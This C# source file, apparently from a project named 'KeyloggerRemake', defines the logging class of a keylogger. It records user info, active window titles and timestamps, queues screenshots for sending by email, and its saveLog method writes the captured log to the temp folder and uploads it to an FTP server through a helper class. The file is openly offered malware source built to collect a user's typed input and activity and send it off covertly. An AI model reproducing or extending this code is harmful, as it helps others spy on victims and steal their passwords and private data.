using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;

namespace KeyloggerRemake
{
    public class classLog
    {
        public string strLog;
        private string strUserInfo;
        private String strLogStartDateTime;
        public String strLogEndDateTime;
        private String strLogShortDateTime;

        //The stack to store the screenshots, needed for sending via email (Only way)
        public Queue<classScreenshot> stkScreenshots = new Queue<classScreenshot>();

        //Constructor for the log
        public classLog()
        {
            strUserInfo = classGetUserInfo.getUserInfo(); //Gets the user info
            strLogStartDateTime = classGetUserInfo.getDateAndTime(); //Gets the long current date/time
        }

        //To add to the log
        public string addToLog(String strInfo)
        { //Takes in the info to add
            strLog += strInfo;
            return strInfo;
        }

        //To print once the logging started
        public string printStartedLog()
        {
            return ("---------------------------------------------------------------------------------" + Environment.NewLine
                 + "KeyLogger started at: " + strLogStartDateTime
                 + strUserInfo + Environment.NewLine
                 + "---------------------------------------------------------------------------------" + Environment.NewLine);
        }

        //To print once the logging stopped
        public string printStoppedLog()
        {
            strLogEndDateTime = classGetUserInfo.getDateAndTime();

            return (Environment.NewLine 
                 + "---------------------------------------------------------------------------------" + Environment.NewLine
                 + "KeyLogger stopped at: " + strLogEndDateTime
                 + strUserInfo + Environment.NewLine
                 + "---------------------------------------------------------------------------------" + Environment.NewLine);
        }

        //To print any new windows when started
        public string printNewWindow()
        {
            strLogShortDateTime = classGetUserInfo.getShortDTime();

            return (Environment.NewLine + "----------------------------------------------------------------------------" + Environment.NewLine
                 + "New window found at: " + strLogShortDateTime + Environment.NewLine
                 + "Window: " + classGetUserInfo.strCurrentWindow + Environment.NewLine
                 + "----------------------------------------------------------------------------" + Environment.NewLine);
        }

        //To save the log for FTP
        public void saveLog(string strHost, string strUser, string strPass)
        { //Takes in the FTP details (From the Controller)
            strLogShortDateTime = classGetUserInfo.getShortDTime(); //Gets the log date

            string strLogName = "\\Log " + strLogShortDateTime + ".txt"; //Sets the log name
            string strLogFile = Path.GetTempPath() + strLogName; //Sets the log file directory

            using (StreamWriter swWriter = new StreamWriter(strLogFile))
            {
                swWriter.Write(strLog); //Writes the log onto the log file
            }

            classFTP.uploadLog(strHost, strUser, strPass, strLogName, strLogFile); //Uploads the file to FTP
        }
        
        //To check if the screenshot was previously taken
        public bool screenshotExists(string strScreenshotName)
        { //Takes in the screenshot name
            //Checks any identical screenshot names in the stack
            bool blScreenshotExists = stkScreenshots.Any(s => s.strScreenshotName == strScreenshotName);

            return blScreenshotExists; //True if exists, false if not
        }       
    }
}
